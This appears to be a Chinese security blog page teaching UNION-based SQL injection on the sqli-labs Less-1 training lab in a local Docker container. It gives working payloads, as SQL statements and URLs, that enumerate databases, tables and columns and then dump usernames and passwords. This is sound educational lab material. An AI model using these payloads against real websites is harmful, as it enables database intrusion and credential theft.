@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>1.2.1-SQL注入-SQL注入语法类型-union联合查询注入 | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">1.2.1-SQL注入-SQL注入语法类型-union联合查询注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">六月 16, 2018&nbsp;&nbsp;0:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+                            
+                                <a href="/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/">web安全</a>
+                            
+                                <a href="/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="union查询注入"><a href="#union查询注入" class="headerlink" title="union查询注入"></a>union查询注入</h2><h3 id="union介绍"><a href="#union介绍" class="headerlink" title="union介绍"></a>union介绍</h3><p>SQL UNION 操作符<br>用于合并两个或多个SELECT语句的结果集。<br>注意：<br>SELECT语句必须拥有<strong>相同数量</strong>的列。<br>列也必须拥有<strong>相似的数据类型</strong>。<br>每条SELECT语句中列的<strong>顺序必须相同</strong>。  </p>
+<p>默认情况，UNION操作符选取不同的值，允许重复的值，使用UNION ALL。  </p>
+<pre><code>SELECT column_name(s) FROM table_name1
+UNION
+SELECT column_name(s) FROM table_name2
+
+SELECT column_name(s) FROM table_name1
+UNION ALL
+SELECT column_name(s) FROM table_name2
+</code></pre>
+<h3 id="union查询注入方法"><a href="#union查询注入方法" class="headerlink" title="union查询注入方法"></a>union查询注入方法</h3><h4 id="UNION-注入应用场景"><a href="#UNION-注入应用场景" class="headerlink" title="UNION 注入应用场景"></a>UNION 注入应用场景</h4><p>前提：<br>1.只要UNION连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果；<br>2.注入点页面有回显；</p>
+<p>注意点：<br>1.只有最后一个SELECT子句允许有ORDER BY；<br>2.只有最后一个SELECT子句允许有LIMIT；</p>
+<pre><code>mysql&gt; select * from users order by id union select 1,2,3;
+错误 orderby 要在最后一个子句后面
+
+mysql&gt; select * from users limit 0,1 union select;
+错误 limit 要在最后一个子句后面
+</code></pre>
+<h4 id="UNION注入过程-根据Sqli-labs-Less1-4学习"><a href="#UNION注入过程-根据Sqli-labs-Less1-4学习" class="headerlink" title="UNION注入过程-根据Sqli-labs Less1-4学习"></a>UNION注入过程-根据Sqli-labs Less1-4学习</h4><p>tips：order by 猜出来的列数超过数据库表中的列数，报错并不能返回数据  </p>
+<ol>
+<li>order by 确定列数</li>
+<li>观察页面返回，选取可以显示数据的位置，进行下一步的注入</li>
+<li>读库信息</li>
+<li>读表信息 </li>
+<li>读字段</li>
+<li>读数据</li>
+</ol>
+<hr>
+<pre><code>docker run -dt --name sqli -p 90:80 --rm acgpiano/sqli-labs 
+docker ps -a
+docker exec -it &lt;id&gt; /bin/bash
+mysql -uroot -p
+show databases;
+use security;
+
+1. select * from users order by 4; // order by 判断多少列 从1～3 报错了确定有4列
+
+2. select * from users where id=1 union select 1,2,3;
+select * from users where id=-1 union select 1,(select version()),3;
+
+3. select * from users where id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata);
+
+4. select * from users where id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;); // 当前库可以换成database() &#39;&#39;不识别可以换成十六进制0x
+
+5. select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;);
+
+6. select * from users where id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users);
+</code></pre>
+<p>浏览器访问：<br><a target="_blank" rel="noopener" href="http://127.0.0.1:90/Less-1/">http://127.0.0.1:90/Less-1/</a>  </p>
+<pre><code>http://127.0.0.1:90/Less-1/?id=1&#39;
+http://127.0.0.1:90/Less-1/?id=1&#39; order by 1 --+ // 二分法试
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,3 --+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(version())--+ // user() database()
+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+
+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+
+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+
+
+http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from users)--+
+</code></pre>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/2839042794.html">http://tea9.xyz/post/2839042794.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/sql%E6%B3%A8%E5%85%A5/"># sql注入</a>
+                    
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/post/378823961.html">网络课程列表</a>
+            
+            
+            <a class="next" rel="next" href="/post/4239639054.html">1.2.2-SQL注入-SQL注入语法类型-报错注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
